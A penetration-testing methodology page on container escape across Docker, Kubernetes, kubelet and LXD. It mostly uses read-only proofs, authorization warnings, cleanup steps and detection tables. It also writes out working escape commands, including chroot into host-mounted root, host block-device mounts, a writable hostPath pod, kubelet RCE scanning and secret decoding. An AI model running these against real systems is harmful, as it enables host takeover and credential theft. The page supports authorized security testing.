# Container Escape

A container shell is an isolated process context, not necessarily the final target. Escape risk depends on the runtime, effective capabilities, mounted host paths, daemon sockets, orchestrator credentials, and network reachability. This page uses low-impact proofs to determine whether container access can cross into the host or cluster control plane.

{% hint style="danger" %}
Container and cluster boundaries may have separate authorization. Confirm that host escape, Kubernetes API access, pod creation, and cross-namespace testing are explicitly in scope before attempting them. Prefer read-only proof and remove every test workload.
{% endhint %}

## Identify the environment

```bash
# Common runtime indicators
ls -la /.dockerenv /run/.containerenv 2>/dev/null
cat /proc/1/cgroup
cat /proc/self/status | grep -E '^(Uid|Gid|CapEff)'
hostname

# Mounts, devices, and sockets
cat /proc/mounts
lsblk 2>/dev/null
find /run /var/run -maxdepth 3 -type s -ls 2>/dev/null

# Kubernetes indicators
printenv | grep '^KUBERNETES_'
ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
```

Record:

| Question | Evidence |
| --- | --- |
| Which runtime is in use? | Cgroups, environment files, processes, sockets |
| What privileges exist? | UID/GID, `CapEff`, seccomp, AppArmor/SELinux labels |
| What crosses the boundary? | Bind mounts, devices, daemon sockets, host networking |
| What cluster identity exists? | Service-account namespace, token path, API host |
| What can be reached? | Local sockets and explicitly authorized control-plane ports |

## Capability review

```bash
capsh --print 2>/dev/null
getpcaps $$ 2>/dev/null
cat /proc/self/status | grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)'
```

Capabilities such as `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH`, or broad device access materially weaken isolation. A privileged container often has a nearly complete capability set and host devices available.

For proof, document the effective capability and the protected operation it enables. Avoid loading kernel modules, changing namespaces, or writing to host devices unless a destructive test is explicitly approved.

## Host bind mounts

A bind-mounted host path can expose data or configuration without a kernel escape.

```bash
findmnt -R / 2>/dev/null
awk '$4 ~ /(^|,)rw(,|$)/ {print}' /proc/mounts
```

If a host path is mounted read-only, demonstrate impact with a non-secret file such as the host OS release metadata:

```bash
cat /<HOST_MOUNT>/etc/os-release
```

If it is writable, record the mount options and a harmless test location agreed with the owner. Do not alter host authentication, startup, or security configuration merely to prove write access.

## Docker group and daemon access

Membership in the host `docker` group or permission to use the Docker daemon is effectively root-equivalent because the daemon can mount host filesystems and start privileged containers.

```bash
id
docker version
docker info
docker ps --no-trunc
docker image ls
ls -l /var/run/docker.sock
```

A low-impact host-boundary proof uses a local image and a read-only mount:

```bash
docker run --rm -v /:/host:ro <LOCAL_IMAGE> cat /host/etc/os-release
```

Record the image ID and command. `--rm` cleans up the container, but verify afterward:

```bash
docker ps -a --filter ancestor=<LOCAL_IMAGE>
docker volume ls
```

Do not pull an unapproved image or mount sensitive directories when the daemon metadata and read-only OS file already prove host access.

## Mounted Docker socket

A container with access to `docker.sock` controls the host daemon even when no Docker CLI is installed.

```bash
find / -type s -name 'docker.sock' 2>/dev/null
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

The version and container inventory usually provide sufficient evidence. Creating a container through the API has a larger footprint and should require separate approval. Detection sources include Docker daemon events, audit rules on the socket, container-create events, and unexpected host bind mounts.

## Privileged containers

Indicators include broad effective capabilities, visible host block devices, host PID/network namespaces, or writable system mounts.

```bash
capsh --print 2>/dev/null
ls -la /dev
readlink /proc/1/ns/{mnt,pid,net,user}
readlink /proc/self/ns/{mnt,pid,net,user}
```

If host block devices are visible and mounting is authorized, mount the identified host filesystem read-only:

```bash
mkdir -p /mnt/host-proof
mount -o ro /dev/<HOST_PARTITION> /mnt/host-proof
cat /mnt/host-proof/etc/os-release
umount /mnt/host-proof
rmdir /mnt/host-proof
```

Never guess the partition on a production host. Use `lsblk`, filesystem labels, and owner confirmation first.

## Kubernetes service accounts

Pods commonly receive a namespace, CA certificate, and service-account token:

```bash
sa=/var/run/secrets/kubernetes.io/serviceaccount
cat "$sa/namespace"
ls -l "$sa"
```

Use the token in place without printing it into terminal transcripts:

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
TOKEN=$(cat "$sa/token")
curl --cacert "$sa/ca.crt" \
  -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api"
```

With `kubectl` available, enumerate effective permissions before requesting data:

```bash
kubectl --server="$APISERVER" \
  --certificate-authority="$sa/ca.crt" \
  --token="$TOKEN" \
  auth can-i --list
```

High-impact permissions include reading secrets, creating pods, using `pods/exec`, creating role bindings, or changing workloads. Report the permission boundary; do not collect unrelated secrets.

## Controlled hostPath proof

If pod creation and host escape are explicitly authorized, use a uniquely named pod with a read-only host mount and a short lifetime:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: assessment-hostpath-<ENGAGEMENT_ID>
spec:
  restartPolicy: Never
  containers:
    - name: proof
      image: <APPROVED_IMAGE>
      command: ["sh", "-c", "cat /host/etc/os-release; sleep 300"]
      volumeMounts:
        - name: host
          mountPath: /host
          readOnly: true
  volumes:
    - name: host
      hostPath:
        path: /
        type: Directory
```

Apply, capture proof, and delete it:

```bash
kubectl apply -f assessment-hostpath.yaml
kubectl logs pod/assessment-hostpath-<ENGAGEMENT_ID>
kubectl delete -f assessment-hostpath.yaml --wait=true
kubectl get pod assessment-hostpath-<ENGAGEMENT_ID>
```

Kubernetes audit logs should show the creating identity, pod specification, and deletion. Also verify that no service, role binding, secret, or persistent volume was created.

## Kubelet exposure

Kubelet commonly listens on TCP 10250. An exposed endpoint may disclose pod metadata or permit command execution depending on authentication and authorization.

```bash
curl -sk -o /dev/null -w '%{http_code}\n' https://<KUBELET_IP>:10250/pods
kubeletctl -i --server <KUBELET_IP> pods
kubeletctl -i --server <KUBELET_IP> scan rce
```

Treat a successful anonymous metadata request or executable pod as the finding. Avoid dumping service-account tokens when the access-control failure is already demonstrated.

## LXD and LXC

Membership in the `lxd` or `lxc` group may permit creation of a privileged container with a host disk attached.

```bash
id
lxc version
lxc list
lxc image list
```

If validation is approved, use an existing local image and a read-only host disk:

```bash
lxc init <LOCAL_IMAGE_ALIAS> assessment-<ENGAGEMENT_ID>
lxc config set assessment-<ENGAGEMENT_ID> security.privileged true
lxc config device add assessment-<ENGAGEMENT_ID> host-root disk source=/ path=/mnt/root readonly=true
lxc start assessment-<ENGAGEMENT_ID>
lxc exec assessment-<ENGAGEMENT_ID> -- cat /mnt/root/etc/os-release
```

Cleanup:

```bash
lxc stop assessment-<ENGAGEMENT_ID> --force
lxc delete assessment-<ENGAGEMENT_ID>
lxc list
```

## Lab and Training Exercises

The following variants provide an interactive host context rather than a read-only proof. Use them only on a disposable single-purpose host or cluster where full host compromise is expected.

### Writable Docker host mount

```bash
docker run --rm -it -v /:/host <LOCAL_IMAGE> chroot /host /bin/bash
```

The shell is effectively host root. Avoid changing authentication or startup files; run `id`, exit, and verify the temporary container was removed.

### Privileged container device mount

```bash
lsblk
mkdir -p /mnt/host
mount /dev/<HOST_PARTITION> /mnt/host
chroot /mnt/host /bin/bash
exit
umount /mnt/host
rmdir /mnt/host
```

Selecting the wrong block device or writing through a mounted filesystem can corrupt the host. Confirm the device from the lab topology before mounting it.

### Writable Kubernetes hostPath pod

Change the controlled hostPath manifest's `readOnly` setting to `false`, apply it, and exec into the pod:

```bash
kubectl apply -f assessment-hostpath.yaml
kubectl exec -it assessment-hostpath-<ENGAGEMENT_ID> -- chroot /host /bin/sh
kubectl delete -f assessment-hostpath.yaml --wait=true
```

The pod can modify the node filesystem. Record the pod UID and node, make no durable host changes, and verify the pod and related resources are absent.

### Kubernetes secret access

When the service account has `get` permission on secrets, retrieve only a dedicated lab secret:

```bash
kubectl auth can-i get secrets
kubectl get secret <LAB_SECRET> -o jsonpath='{.data.<KEY>}' | base64 -d
```

Kubernetes Secret values are Base64-encoded, not inherently encrypted. Do not dump all namespaces or retain decoded credentials after the exercise.

## Detection and evidence

| Vector | Detection sources |
| --- | --- |
| Docker socket | Socket audit rules, Docker events, daemon API logs |
| Privileged container | Runtime configuration, admission policy, capability telemetry |
| Host bind mount | Container specification, mount events, file-access telemetry |
| Service-account abuse | Kubernetes audit logs and unusual API verbs |
| Privileged pod | Admission-controller events and pod security violations |
| LXD/LXC | Daemon logs, new instance/configuration events, host disk devices |

Capture the identity, permissions, command or manifest, read-only proof, runtime event, and cleanup result. Redact tokens and secrets from screenshots and reports.

## Related

- [Linux Privilege Escalation](linux-privesc-methodology.md)
- [Game of Pods](game-of-pods.md)
- [Lateral Movement](lateral-movement.md)
- [Pivoting & Tunneling](pivoting-tunneling.md)
- [Report Writing](report-writing.md)
